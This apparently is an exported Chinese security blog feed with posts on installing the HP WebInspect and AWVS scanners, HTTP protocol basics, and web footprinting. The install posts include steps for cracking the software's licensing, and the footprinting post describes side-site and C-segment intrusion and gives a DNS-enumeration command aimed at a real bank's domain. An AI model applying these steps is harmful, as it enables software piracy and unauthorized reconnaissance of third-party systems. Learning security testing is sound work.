<h4 id="WebInspect安装使用"><a href="#WebInspect安装使用" class="headerlink" title="WebInspect安装使用"></a>WebInspect安装使用</h4><ul>
<li>如果系统安装过.NET Framework 4.5,跳过安装此程序<br>运行dotnetfx45_full_x86_x64.exe</li>
</ul>
<p><img src="http://i.imgur.com/589m9Cd.png" alt=""></p>
<p><img src="http://i.imgur.com/074eff5.png" alt=""></p>
<ul>
<li>运行SQLEXPR_x64_CHS.exe</li>
</ul>
<p><img src="http://i.imgur.com/s5O3YoN.png" alt=""></p>
<p><img src="http://i.imgur.com/NvGvDsh.png" alt=""></p>
<p><img src="http://i.imgur.com/ecc7pTI.png" alt=""><br>上图中如有管理工具，选择完整<br><img src="http://i.imgur.com/HsKBIN9.png" alt=""></p>
<p><img src="http://i.imgur.com/C9JnOC3.png" alt=""></p>
<p><img src="http://i.imgur.com/fKqVu0U.png" alt=""></p>
<ul>
<li>运行WebInspect 10.2.exe</li>
</ul>
<p><img src="http://i.imgur.com/HYhv4rQ.png" alt=""></p>
<p><img src="http://i.imgur.com/e5bsI4w.png" alt=""></p>
<p><img src="http://i.imgur.com/RmlLt3k.png" alt=""></p>
<p><img src="http://i.imgur.com/8BRnj2T.png" alt=""></p>
<p><img src="http://i.imgur.com/SDKISPn.png" alt=""></p>
<p><img src="http://i.imgur.com/8RvArXk.png" alt=""></p>
<ul>
<li>复制WI8.exe和HPLicense.xml到C:\Program Files (x86)\HP\HP WebInspect。运行WI8..exe</li>
</ul>
<p><img src="http://i.imgur.com/D0QQqJY.png" alt="">    </p>
<p><img src="http://i.imgur.com/oC0hyeV.png" alt=""></p>
<ul>
<li>复制破解补丁目录下的hosts文件覆盖C:\Windows\System32\drivers\etc的hosts文件。</li>
</ul>
<p><img src="http://i.imgur.com/7e8XxnZ.png" alt="">    </p>
<p><img src="http://i.imgur.com/xLliSnf.png" alt="">    </p>
<p><img src="http://i.imgur.com/F2PlnBw.png" alt="">    </p>
<p><img src="http://i.imgur.com/RTfyh2K.png" alt=""></p>
<ul>
<li>打开HP WebInspect</li>
</ul>
<p><img src="http://i.imgur.com/nDNEHIf.png" alt="">    </p>
<p><img src="http://i.imgur.com/84QXtjd.png" alt="">        </p>
<p><img src="http://i.imgur.com/FKLr0Ks.png" alt="">       </p>
<p><img src="http://i.imgur.com/iMocxbj.png" alt="">    </p>
<p><img src="http://i.imgur.com/jVwv4h7.png" alt=""><br>安装完成！</p>
<h4 id="WebInspect新建扫描任务"><a href="#WebInspect新建扫描任务" class="headerlink" title="WebInspect新建扫描任务"></a>WebInspect新建扫描任务</h4><ul>
<li>按箭头所指新建扫描任务</li>
</ul>
<p><img src="http://i.imgur.com/FJHOc7y.png" alt=""></p>
<p><img src="http://i.imgur.com/zIPe7F6.png" alt=""></p>
<ul>
<li>输入目标地址</li>
</ul>
<p><img src="http://i.imgur.com/pWPAP0Y.png" alt=""></p>
<p><img src="http://i.imgur.com/3lusk7N.png" alt=""></p>
<p><img src="http://i.imgur.com/BiGfcKO.png" alt=""></p>
<ul>
<li>创建自动登录</li>
</ul>
<p><img src="http://i.imgur.com/MbXwhnC.png" alt=""></p>
<p><img src="http://i.imgur.com/IbWHEnY.png" alt=""></p>
<p><img src="http://i.imgur.com/ffQzsVv.png" alt=""></p>
<p><img src="http://i.imgur.com/7FZSZs8.png" alt=""></p>
<p><img src="http://i.imgur.com/kzfR7zm.png" alt=""></p>
<p><img src="http://i.imgur.com/gT9OGej.png" alt=""></p>
<p><img src="http://i.imgur.com/FID4NmY.png" alt=""></p>
<ul>
<li>双击登录后才会有的标志，点击play</li>
</ul>
<p><img src="http://i.imgur.com/Uvx9ybz.png" alt=""><br><img src="http://i.imgur.com/BmgOuZ9.png" alt=""></p>
<ul>
<li>自动登录设置完成，下一步</li>
</ul>
<p><img src="http://i.imgur.com/NwhuJ0h.png" alt=""></p>
<p><img src="http://i.imgur.com/Sn976xZ.png" alt=""></p>
<p><img src="http://i.imgur.com/CYA4Or2.png" alt=""></p>
<p><img src="http://i.imgur.com/LQDJJKp.png" alt=""></p>
<p><img src="http://i.imgur.com/SZpvRca.png" alt=""></p>
<ul>
<li>开始扫描</li>
</ul>
<p><img src="http://i.imgur.com/seStIvB.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;目前，许多复杂的 Web 应用程序全都基于新兴的 Web 2.0 技术，HP WebInspect 可以对这些应用程序执行 Web 应用程序安全测试和评估。HP WebInspect 可提供快速扫描功能、广泛的安全评估范围及准确的 Web 应用程序安全扫描结果。它可以识别很多传统扫描程序检测不到的安全漏洞。利用创新的评估技术.&lt;br&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="WEB" scheme="http://yoursite.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>WEB漏洞扫描器</title>
    <link href="http://yoursite.com/2016/09/26/WEB%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    <id>http://yoursite.com/2016/09/26/WEB漏洞扫描器/</id>
    <published>2016-09-26T12:36:23.000Z</published>
    <updated>2016-09-26T13:01:39.285Z</updated>
    
    <content type="html"><![CDATA[<p>一个好的漏洞扫描器在渗透测试中是至关重要的，可以极大的提高工作效率。<br><a id="more"></a></p>
<h4 id="一、什么是web漏洞扫描器"><a href="#一、什么是web漏洞扫描器" class="headerlink" title="一、什么是web漏洞扫描器"></a>一、什么是web漏洞扫描器</h4><p>针对网站漏洞的自动化扣动检测工具，相对于主机及漏洞扫描，例如nessus也可以检测网站漏洞的功能，web漏洞扫描器的主要功能是检测网站漏洞。</p>
<h4 id="二、扫描器的局限"><a href="#二、扫描器的局限" class="headerlink" title="二、扫描器的局限"></a>二、扫描器的局限</h4><ol>
<li>web应用程序各不相同    </li>
<li>扫描器不理解语法    </li>
<li>扫描器不会即兴处理    </li>
<li>扫描器并无直觉</li>
</ol>
<h4 id="三、AWVS漏洞扫描器"><a href="#三、AWVS漏洞扫描器" class="headerlink" title="三、AWVS漏洞扫描器"></a>三、AWVS漏洞扫描器</h4><p>AWVS （Acunetix Web Wulnerability Scanner）是一个自动化的 Web 应用程序安全测试工具，它可以扫描任何可通过Web浏览器访问的和遵循HTTP/HTTPS规则的Web站点和Web应用程序、国内普遍简称WVS。</p>
<h5 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h5><ul>
<li>运行 2015_07_07_00_webvulnscan10.exe 出现如下界面。<br><img src="http://i.imgur.com/5SuVXSi.png" alt=""> </li>
<li>next<br><img src="http://i.imgur.com/q1QhPBa.png" alt=""></li>
<li>接受<br><img src="http://i.imgur.com/7rUVZd3.png" alt=""></li>
<li>next<br><img src="http://i.imgur.com/gq9rxmB.png" alt=""></li>
<li>安装证书（用于HTTPS测试），next<br><img src="http://i.imgur.com/jcp22cl.png" alt=""></li>
<li>创建桌面图标，next<br><img src="http://i.imgur.com/BN17YiQ.png" alt=""></li>
<li>安装准备确认，install<br><img src="http://i.imgur.com/F8k6yu4.png" alt=""></li>
<li>安装证书，选是<br><img src="http://i.imgur.com/tidOTVH.png" alt=""></li>
<li>先不选finish<br><img src="http://i.imgur.com/p2YQEOk.png" alt=""></li>
<li>运行破解补丁</li>
<li>Patch<br><img src="http://i.imgur.com/XXqR0H2.png" alt=""></li>
<li>成功后关闭破解程序</li>
<li>完成安装，选finish自动启动awvs<br><img src="http://i.imgur.com/kZrL550.png" alt=""></li>
<li>破解补丁激活，next。<br><img src="http://i.imgur.com/pAsdAkp.png" alt=""></li>
<li>next<br><img src="http://i.imgur.com/xpgOqiR.png" alt=""></li>
<li>完成破解，同时点finish和确定</li>
<li>桌面启动<br><img src="http://i.imgur.com/yOzM6Qy.png" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一个好的漏洞扫描器在渗透测试中是至关重要的，可以极大的提高工作效率。&lt;br&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="WEB" scheme="http://yoursite.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>HTTP协议</title>
    <link href="http://yoursite.com/2016/09/25/HTTP%E5%8D%8F%E8%AE%AE/"/>
    <id>http://yoursite.com/2016/09/25/HTTP协议/</id>
    <published>2016-09-25T11:46:57.000Z</published>
    <updated>2016-09-25T12:13:17.779Z</updated>
    
    <content type="html"><![CDATA[<p>超文本传输协议（HTTP协议）：访问万维网使用的核心通信协议，也是今天所有web应用程序使用的通讯协议<br><a id="more"></a><br>http使用一种基于消息的模型：客户端送出一条请求消息，而后由服务器返回一条响应消息<br>所有HTTP消息（请求与响应）中都包含一个或几个单行显示的消息头，然后是一个强制空白行，最后是消息主体（可选）。    </p>
<h3 id="一、HTTP请求信息由三部分组成"><a href="#一、HTTP请求信息由三部分组成" class="headerlink" title="一、HTTP请求信息由三部分组成"></a>一、HTTP请求信息由三部分组成</h3><p>HTTP请求的典型实例：<br><img src="http://i.imgur.com/cimo5Ep.png" alt="">    </p>
<p><img src="http://i.imgur.com/pFPDnel.png" alt=""></p>
<p>重要：每个HTTP请求的第一行都有3个以上空格间隔的项目组成。 </p>
<h4 id="1、请求方法URI协议版本"><a href="#1、请求方法URI协议版本" class="headerlink" title="1、请求方法URI协议版本"></a>1、请求方法URI协议版本</h4><p>例子中GET代表请求方法<br>/auth/488/yourdetails.ashx?uid-129是URI，URL通常由所请求的资源名称，以及一个包含客户端向该资源提交的参数可选查询字符组成。HTTP/1.1 代表协议和协议版本。<br>根据HTTP标准，HTTP请求可以使用多种请求方法。例如：HTTP1.1支持7种请求方法：GET、POST、HEAD、OPTIONS、PUT、DELETE和TARCE。在Internet应用中，最常用的方法是GET和POST。<br>因特网上常用的HTTP版本为1.0和1.1，多数浏览器默认使用1.1版本。这两个版本的规范之间存在一些差异；然而，当攻击Web应用程序时，渗透测试员可能遇到的唯一 差异是1.1版本必须使用Host请求头。</p>
<h4 id="2、请求头"><a href="#2、请求头" class="headerlink" title="2、请求头"></a>2、请求头</h4><p>请求头包含许多有关的客户端环境和请求正文的有用信息。例如，请求头可以声明浏览器所用的语言，请求正文的长度等。</p>
<h4 id="3、请求正文"><a href="#3、请求正文" class="headerlink" title="3、请求正文"></a>3、请求正文</h4><p>请求头和请求正文之间是一个空行，这个行非常重要，它表示请求头已经结束，接下来的是请求正文。请求正文中可以包含客户提交的查询字符串信息。</p>
<h3 id="二、HTTP响应信息由三部分组成"><a href="#二、HTTP响应信息由三部分组成" class="headerlink" title="二、HTTP响应信息由三部分组成"></a>二、HTTP响应信息由三部分组成</h3><p>HTTP响应实例：</p>
<p><img src="http://i.imgur.com/NIirsFG.png" alt=""></p>
<h4 id="1、协议状态版本代码描述"><a href="#1、协议状态版本代码描述" class="headerlink" title="1、协议状态版本代码描述"></a>1、协议状态版本代码描述</h4><p>协议状态代码描述HTTP响应的第一行类似于HTTP请求的第一行，它表示通信所用的协议是HTTP1.1服务器已经成功的处理了客户端发出的请求（200表示成功）:<br>HTTP/1.1 200 OK</p>
<h4 id="2、响应头-Response-Header"><a href="#2、响应头-Response-Header" class="headerlink" title="2、响应头(Response Header)"></a>2、响应头(Response Header)</h4><p>响应头(Response Header)响应头也和请求头一样包含许多有用的信息，例如服务器类型、日期时间、内容类型和长度等：</p>
<h4 id="3、响应正文"><a href="#3、响应正文" class="headerlink" title="3、响应正文"></a>3、响应正文</h4><p>响应正文响应正文就是服务器返回的HTML页面<br>重点：响应头和正文之间也必须用空行分隔。<br>每个HTTP响应的第一行由三个以上空格间隔的项目组成</p>
<h3 id="三、HTTP方法："><a href="#三、HTTP方法：" class="headerlink" title="三、HTTP方法："></a>三、HTTP方法：</h3><p>当渗透测试员攻击Web应用程序时，几乎肯定会遇到最常用的方法：GET和POST。这些方法之间存在一些必须了解的重要差异，忽略这些差异可能会危及应用程序的安全。    </p>
<h4 id="GET方法"><a href="#GET方法" class="headerlink" title="GET方法"></a>GET方法</h4><p>从web服务器获取资源，它可以用于URL查询字符串的形式向所请求的资源发送参数。这使用户可将一个包含动态资源的URL标注为书签，用户自己或其它用户随后可重复利用该书签来获取等价的资源。URL显示在屏幕上，并被记录在许多地方，如浏览器的历史记录和Web服务器的访问日志中。如果单击外部链接，还可以用Referer消息头将他们传送到其它站点。因此，请勿使用查询字符串传送任何敏感信息。</p>
<h4 id="POST方法"><a href="#POST方法" class="headerlink" title="POST方法"></a>POST方法</h4><p>执行操作，使用这个方法可以在URL查询字符串与消息主体中发送请求参数。许多维护URL日志的位置及Referer消息头也将这些参数排除在外。因为POST方法旨在执行操作，如果用户单击浏览器上的“后退”按钮，返回一个这种方法返回的页面，那么浏览器不会自动重新发送请求，而是就即将发生的操作向用户发出警告。这样做可防止用户无意中多次执行同一个操作。因此在执行某已操作事必须使用POST请求。</p>
<h4 id="HEAD方法"><a href="#HEAD方法" class="headerlink" title="HEAD方法"></a>HEAD方法</h4><p>功能与GET相似，不同之处在于不会在其响应中返回消息主体。服务器返回的消息头应与对应GET请求返回的消息头相同。因此，这种方法可用于检查某一资源在向其提交GET请求前是否存在。</p>
<h4 id="TRACE方法"><a href="#TRACE方法" class="headerlink" title="TRACE方法"></a>TRACE方法</h4><p>用于诊断，服务器应在相应主体中返回其受到的请求消息的具体内容这种方法可用于检测客户端与服务器之间是否存在任何操作请求的代理服务器。</p>
<h4 id="OPTIONS方法"><a href="#OPTIONS方法" class="headerlink" title="OPTIONS方法"></a>OPTIONS方法</h4><p>要求服务器报告对某一特殊资源有效的HTTP方法，服务器通常返回一个包含Allow消息头的相应，并在其中列出所有有效的方法。</p>
<h4 id="PUT方法"><a href="#PUT方法" class="headerlink" title="PUT方法"></a>PUT方法</h4><p>这个方法试图使用包含在请求主体中的内容，向服务器上传制定的资源。如果激活这个方法，渗透测试员就可以利用它来攻击应用程序，例如，通过上传任意一段脚本并在服务器上执行该脚本来攻击应用程序。</p>
<h3 id="四、URL"><a href="#四、URL" class="headerlink" title="四、URL"></a>四、URL</h3><p>同一资源定位符是标识WEB资源的唯一标识符，通过它可以获取其标识的资源。</p>
<h3 id="五、常用消息头："><a href="#五、常用消息头：" class="headerlink" title="五、常用消息头："></a>五、常用消息头：</h3><ul>
<li>Connection ：用于告诉通信的另一端，在完成HTTP传输后是关系TCP连接，还是保持连接开放以接收其他消息。    </li>
<li>Content-Encoding ：为消息主体中的内容制定编码形式（如gzip），一些应用程序使用它来压缩相应以加快传输速度。</li>
<li>Content-Length ：用于规定消息主体的字节长度。</li>
<li>Content-Type ：用于规定消息主体的内容类型。例如，HTML文档的内容类型为text/html</li>
<li>Transfer-Encoding：指定为方便其通过HTTP传输而对消息主体使用的任何编码。如果使用这个消息头，通常用它指定块编码。</li>
</ul>
<h3 id="六、请求消息头："><a href="#六、请求消息头：" class="headerlink" title="六、请求消息头："></a>六、请求消息头：</h3><ul>
<li>accept：用于告诉服务器客户端愿意接受哪些内容，如图像类型，办公文档格式等。</li>
<li>Accept-Encoding：用于告诉服务器，客户端愿意接受哪些内容编码。</li>
<li>Authorization：用于为一种内置的HTTP身份验证向服务器提交证书。</li>
<li>Host：用于指定出现在所请求的完整URL中的主机名称。</li>
<li>Cookie：用于提交服务器向客户端发布的其他参数。</li>
<li>If-Modified-Since：用于说明浏览器最后一次受到所请求的资源的时间。</li>
<li>Origin：用在跨域Ajax请求中，用于指示提出请求的域。</li>
<li>Referer：用于指示提出当前请求的原始URL。</li>
<li>User-Agent：提供与浏览器或生成请求的其他客户端软件有关的信息，请注意，由于历史原因，大多数浏览器中都包含Mozilla前缀。</li>
</ul>
<h3 id="七、响应消息头："><a href="#七、响应消息头：" class="headerlink" title="七、响应消息头："></a>七、响应消息头：</h3><ul>
<li>Access-Control-Allow-Origin：用于指示可否通过跨域Ajax请求获取资源。</li>
<li>Cache-Control：用于向浏览器传送缓存指令（如no-cache）。只能用于http 1.1</li>
<li>ETag：用于指定一个实体标签。</li>
<li>Expires：用于向浏览器说明消息主体内容的有效时间。</li>
<li>Location。 ：用于在重定向响应（那些状态吗以3开头的响应）中说明重定向的目标。</li>
<li>Pragma：用于向浏览器（http 1.0 和http 1.1）。</li>
<li>Server：提供所使用的Web服务器软件的相关信息。</li>
<li>Set-Cookie ：用于向浏览器发布cookie，浏览器会在随后的请求中将其返回给服务器。</li>
<li>WWW-Authenticate ：用在带401状态码的响应中，提供与服务器所支持的身份验证类型有关的信息。</li>
<li>X-Frame-Options：指示浏览器框架是否及如何加载当前响应。</li>
</ul>
<h3 id="八、cookie"><a href="#八、cookie" class="headerlink" title="八、cookie"></a>八、cookie</h3><p>是大多数Web应用程序所依赖2的HTTP协议的一个关键组成部分，攻击者常常通过它来利用Web应用程序中的漏洞。服务器使用cookie机制向客户端发送数据，客户端保存cookie并将其返回给服务器。与其他类型的请求参数（存在于URL查询字符串或消息主体中）不同，无需应用程序或用户采取任何特殊措施，随后的一个每一个请求都会继续重新向服务器提交cookie。服务器使用Set-Cookie响应消息头发布cookie：<br><img src="http://i.imgur.com/vKcpUvq.png" alt=""><br>用于向浏览器发布cookie，然后，用户的浏览器自动将下面的消息头添加到随后返回给同一服务器的请求中。<br><img src="http://i.imgur.com/ELSftp6.png" alt=""><br>cookie一般由一个名/值对构成，但也可包含任何不含空格的字符串。可以在服务器响应中使用几个Set-Cookie消息头发布多个cookie, 并可在同一个cookie消息头中分隔不同的cookie，将他们全部返回给服务器。</p>
<p>除cookie的实际值外，Set-Cookie消息头还可包含以下任何可选属性，用它们控制浏览器处理cookie的方式。    </p>
<ul>
<li>Expires：用于设定cookie的有效时间。。这样会使浏览器将cookie保存在永久性的存储器中，在随后的浏览器会话中重复利用，直到到期时间为止。如果没有设定这个属性，那么cookie仅用在当前浏览器会话中。</li>
<li>Domain：用于指定cookie的有效域。这个域必须和收到cookie的域相同，或者是它的父域。</li>
<li>Path用：于指定cookie的有效URL路径。</li>
<li>Secure：如果设置这个属性，则仅在HTTPS请求中提交cookie。</li>
<li>HttpOnly：如果设置这个属性，将无法通过客户端JavaScript直接访问cookie。</li>
</ul>
<h3 id="九、状态码"><a href="#九、状态码" class="headerlink" title="九、状态码"></a>九、状态码</h3><p>每条HTTP相应消息都必须在第一行中包含一个状态码，说明请求的结果。</p>
<ul>
<li>1xx—-提供信息</li>
<li>2xx—-请求被成功提交。</li>
<li>3xx—-客户端被重定向到其他资源。</li>
<li>4xx—-请求包含某种错误。</li>
<li>5xx—-服务器执行请求时遇到错误。</li>
</ul>
<h4 id="100-Continue"><a href="#100-Continue" class="headerlink" title="100 Continue"></a>100 Continue</h4><p>当客户端提交一个包含主体的请求时，将发送这个响应。改响应表示已收到请求消息头，客户端应继续发送主体。请求完成后，再由服务器返回另一个响应。</p>
<h4 id="200-Ok"><a href="#200-Ok" class="headerlink" title="200 Ok"></a>200 Ok</h4><p>本状态码表示已成功提交请求，且响应主体中包含请求结果。</p>
<h4 id="201-Created"><a href="#201-Created" class="headerlink" title="201 Created"></a>201 Created</h4><p>PUT请求的响应返回这个状态码，表示请求以成功提交。</p>
<h4 id="301-Moved-Permanently"><a href="#301-Moved-Permanently" class="headerlink" title="301 Moved Permanently"></a>301 Moved Permanently</h4><p>将浏览器永久重定向到另外一个在Location消息头中指定的URl。</p>
<h4 id="302-Found。"><a href="#302-Found。" class="headerlink" title="302 Found。"></a>302 Found。</h4><p>本状态码将浏览器暂时重定向到另外一个在Location消息头中指定的URL。客户端应在随后的请求中恢复使用原始URL。</p>
<h4 id="304-Not-Modified。"><a href="#304-Not-Modified。" class="headerlink" title="304 Not Modified。"></a>304 Not Modified。</h4><p>本状态码指示浏览器使用缓存中保存的所请求资源的副本。服务器使用IF-Modified-Since与If-None-Match消息头确定客户端是否拥有最新版本的资源。</p>
<h4 id="400-Bad-Request。"><a href="#400-Bad-Request。" class="headerlink" title="400 Bad Request。"></a>400 Bad Request。</h4><p>本状态码表示客户端提交了一个无效的HTTP请求。当以某种无效的方式修改请求时（例如在URL中插入一个空格符），可能会遇到这个状态码。</p>
<h4 id="401-Unauthorized。"><a href="#401-Unauthorized。" class="headerlink" title="401 Unauthorized。"></a>401 Unauthorized。</h4><p>服务器在许可请求前要求HTTP进行身份验证。WWW-Authenticate消息头详细说明所支持的身份验证类型。</p>
<h4 id="403-Forbidden。"><a href="#403-Forbidden。" class="headerlink" title="403  Forbidden。"></a>403  Forbidden。</h4><p>不管是否通过身份验证，禁止任何人访问被请求的资源。</p>
<h4 id="404-Not-Found。"><a href="#404-Not-Found。" class="headerlink" title="404 Not Found。"></a>404 Not Found。</h4><p>本状态码表示所请求的资源并不存在。 </p>
<h4 id="405-Method-Not-Allowed。"><a href="#405-Method-Not-Allowed。" class="headerlink" title="405 Method Not Allowed。"></a>405 Method Not Allowed。</h4><p>本状态码表示指定URL的不支持的请求中的使用的方法。例如，如果试图在不支持PUT方法的地方使用该方法，就会收到本状态码。</p>
<h4 id="413-Request-Entity-Too-Large。"><a href="#413-Request-Entity-Too-Large。" class="headerlink" title="413 Request Entity Too Large。"></a>413 Request Entity Too Large。</h4><p>如果在本地代码中探查缓冲器溢出漏洞并就此提交超长数据串，则本状态码表示请求主体过长，服务器无法处理。</p>
<h4 id="414-Request-URI-Too-Long。"><a href="#414-Request-URI-Too-Long。" class="headerlink" title="414 Request URI Too Long。"></a>414 Request URI Too Long。</h4><p>与前一个响应类似，本状态码表示请求中的URL过长，服务器无法处理。</p>
<h4 id="500-Internal-Server-Error。"><a href="#500-Internal-Server-Error。" class="headerlink" title="500 Internal Server Error。"></a>500 Internal Server Error。</h4><p>本状态码表示服务器在执行请求时遇到错误。当提交无法预料的输入、在应用程序处理过程中造成无法处理的错误时，通常会收到本状态码。应该仔细检查服务器响应的所有内容，了解与错误性质有关的详情。</p>
<h4 id="503-Server-Unavailable。"><a href="#503-Server-Unavailable。" class="headerlink" title="503 Server Unavailable。"></a>503 Server Unavailable。</h4><p>通常，本状态码表示尽管Web服务器运转正常，并且能够响应请求，但服务器访问的应用程序还是无法做出响应。应该进行核实，是否因为执行了某种行为而造成这个结果。</p>
<h3 id="十、编码方案"><a href="#十、编码方案" class="headerlink" title="十、编码方案"></a>十、编码方案</h3><p>字符串是一种数据类型，但是，字符串比较特殊的是还有一个编码问题。因为计算机只能处理数字，如果要处理文本，就必须先把文本转换为数字才能处理。</p>
<h4 id="ASCII编码："><a href="#ASCII编码：" class="headerlink" title="ASCII编码："></a>ASCII编码：</h4><p>由于计算机是美国人发明的，因此，最早只有127个字符被编码到计算机里，也就是大小写英文字母、数字和一些符号。ASCII编码是1个字节。<br>Unicode：<br>Unicode把所有语言都统一到一套编码里。Unicode标准也在不断发展，但最常用的是用两个字节表示一个字符（如果要用到非常偏僻的字符，就需要4个字节）。现代操作系统和大多数编程语言都直接支持Unicode。Unicode编码比ASCII编码需要多一倍的存储空间，在存储和传输上就十分不划算。<br>攻击Web应用程序时之所以要用到Unicode编码，主要在于有时可用它来破坏输人确认机制。 如果输人过滤阻止了某些恶意表达式，但随后处理输人的组件识别Unicode编码，就可以使用各 种标准与畸形Unicode编码避开过滤。</p>
<h4 id="UTF-8编码："><a href="#UTF-8编码：" class="headerlink" title="UTF-8编码："></a>UTF-8编码：</h4><p>本着节约的精神，又出现了把Unicode编码转化为“可变长编码”的UTF-8编码。UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节。如果你要传输的文本包含大量英文字符，用UTF-8编码就能节省空间。ASCII编码实际上可以被看成是UTF-8编码的一部分，所以，大量只支持ASCII编码的历史遗留软件可以在UTF-8编码下继续工作。UTF-8编码的多字节字符以%为前缀，其后用十六进制表示每个字节。</p>
<p>用记事本编辑的时候，从文件读取的UTF-8字符被转换为Unicode字符到内存里，编辑完成后，保存的时候再把Unicode转换为UTF-8保存到文件：</p>
<p><img src="http://i.imgur.com/pT7dsie.png" alt=""></p>
<p>计算机系统通用的字符编码工作方式：在计算机内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码。</p>
<h4 id="URL编码："><a href="#URL编码：" class="headerlink" title="URL编码："></a>URL编码：</h4><p>URL只允许使用US-ASCII字符集中的可打印字符（也就是ASCII代码在0x20 ~ 0x7e范围内的 字符)。<br>常见的URL编码字符：</p>
<ul>
<li>%3d代表=;</li>
<li>%25代表%;</li>
<li>%20代表空格；</li>
<li>%0a代表新行；</li>
<li>%00代表空字节。<br>另一个值得注意的编码字符是加号（ + )，它代表URL编码的空格（除%20代表空格外)。</li>
</ul>
<h4 id="HTML-编码："><a href="#HTML-编码：" class="headerlink" title="HTML 编码："></a>HTML 编码：</h4><p>HTML编码是一种用于表示问题字符以将其安全并人HTML文档的方案。HTML编码主要在探査跨站点脚本漏洞时发挥作用。如果应用程序 在响应中返回未被修改的用户输人，那么它可能易于受到攻击；但是，如果它对危险字符进行 HTML编码，也许比较安全。<br>HTML编码定义了大量HTML实体来表示特殊的字面量字符。</p>
<ul>
<li>&quot;代表”;</li>
<li>&apos;代表 ‘;</li>
<li>&amp;代表 &amp;;</li>
<li>&lt;代表 &lt;;</li>
<li>&gt;代表 &gt;</li>
</ul>
<h4 id="Base64-编码："><a href="#Base64-编码：" class="headerlink" title="Base64 编码："></a>Base64 编码：</h4><p>Base64编码仅用一个可打印的ASCII字符就可安全转换任何二进制数据，它常用于对电子邮 件附件进行编码，使其通过SMTP安全传输。它还可用于在基本HTTP验证机制中对用户证书进行编码。<br>Web应用程序利用Base64编码在cookie与其他参数中传送二进制数据，甚至用它打乱敏感数据以防止即使是细微的修改。应该总是留意并解码发送到客户端的任何Base64数据。由于这 些数据使用特殊的字符集，而且有时会在字符串末尾添加补足字符（ = ),因此可以轻易辨别出 Base64编码的字符串。（如果最后的输人数据块不能构成3段输出数据，就用一个或两个等号（=)补足输出）</p>
<h4 id="十六进制编码："><a href="#十六进制编码：" class="headerlink" title="十六进制编码："></a>十六进制编码：</h4><p>许多应用程序在传送二进制数据时直接使用十六进制编码，用ASCII字符表示十六进制数据块。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;超文本传输协议（HTTP协议）：访问万维网使用的核心通信协议，也是今天所有web应用程序使用的通讯协议&lt;br&gt;
    
    </summary>
    
      <category term="协议" scheme="http://yoursite.com/categories/%E5%8D%8F%E8%AE%AE/"/>
    
    
      <category term="HTTP" scheme="http://yoursite.com/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>WEB踩点</title>
    <link href="http://yoursite.com/2016/09/22/WEB%E8%B8%A9%E7%82%B9/"/>
    <id>http://yoursite.com/2016/09/22/WEB踩点/</id>
    <published>2016-09-22T05:25:55.000Z</published>
    <updated>2016-11-08T10:02:10.267Z</updated>
    
    <content type="html"><![CDATA[<p>对于白帽子来说，在开始渗透之前，必须先完成信息收集，那么信息收集的第一步是什么呢？就是WEB踩点。<br><a id="more"></a></p>
<h3 id="什么是踩点"><a href="#什么是踩点" class="headerlink" title="什么是踩点"></a>什么是踩点</h3><p>踩点：就是对指定目标进行系统的网站信息收集，攻击者将尽可能多的收集目标单位的安全情况的方方面面。</p>
<h3 id="为什么要踩点"><a href="#为什么要踩点" class="headerlink" title="为什么要踩点"></a>为什么要踩点</h3><p>知己知彼，百战不殆。<br>每个人都有自己的习惯、思维方式，发掘他的习惯、思维方式，就是他的弱点。踩点是最辛苦的任务之一，它也是最枯燥的，同样也是最重要的任务之一。</p>
<h3 id="WEB踩点的常见手段"><a href="#WEB踩点的常见手段" class="headerlink" title="WEB踩点的常见手段"></a>WEB踩点的常见手段</h3><h4 id="0x01-网站共享主机（旁注）"><a href="#0x01-网站共享主机（旁注）" class="headerlink" title="0x01  网站共享主机（旁注）"></a>0x01  网站共享主机（旁注）</h4><p>旁注是网络上比较流行的一种入侵方法，在字面上解释就是”从旁注入”，利用同一主机上面不同网站的漏洞得到 webshell，从而利用主机上的程序或者是服务所暴露的用户所在的物理路径进行入侵。<br>网站共享主机漏洞是更为严谨的学术叫法。    </p>
<ul>
<li><p>关于c段旁注<br>旁注与C段嗅探的意义，旁注的意思就是从同台服务器上的其他网站入手，提权，然后把服务器端了，就自然把那个网站端了。C段嗅探，每个IP有 ABCD 四个段，举个例子192.168.0.1，A段就是192，B段是168，C段0，D 段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255 中的一台服务器，然后利用工具嗅探拿下该服务。     </p>
</li>
<li><p>旁站入侵和C段入侵哪个更理想<br>旁站入侵更为理想。C段嗅探还涉及到提权，ARP。还要等待管理员登陆，才能抓取到密码。</p>
</li>
<li><p>常用工具<br>k8_c段旁注查询工具</p>
</li>
</ul>
<h4 id="0x02-WHOIS服务"><a href="#0x02-WHOIS服务" class="headerlink" title="0x02  WHOIS服务"></a>0x02  WHOIS服务</h4><p>利用whois服务，可以获取与目标相关的具体信息，包括注册人邮箱，IP地址，公司DNS主机名以及地址和电话号码等信息。</p>
<ul>
<li>whois信息一定可以查到所需要信息的吗？如果查不到是什么原因？<br>不一定哦，稍微有安全意识的注册人会设置隐私保护</li>
<li>常用工具<br>站长之家，爱站网</li>
</ul>
<h4 id="0x03-二级域名"><a href="#0x03-二级域名" class="headerlink" title="0x03  二级域名"></a>0x03  二级域名</h4><ul>
<li>搜索引擎 site指令<br>百度，谷歌，必应</li>
<li>dns区域传送/域名暴力枚举<br>fierce 是使用多种技术来扫描目标主机IP地址和主机名的一个DNS服务枚举工具。<br>工作原理：先通过查询本地DNS服务器来查询目标DNS服务器，然后使用目标DNS服务器来查找子域名。<br>具体命令：fierce -dns ccb.com -threads（线程数） 100</li>
</ul>
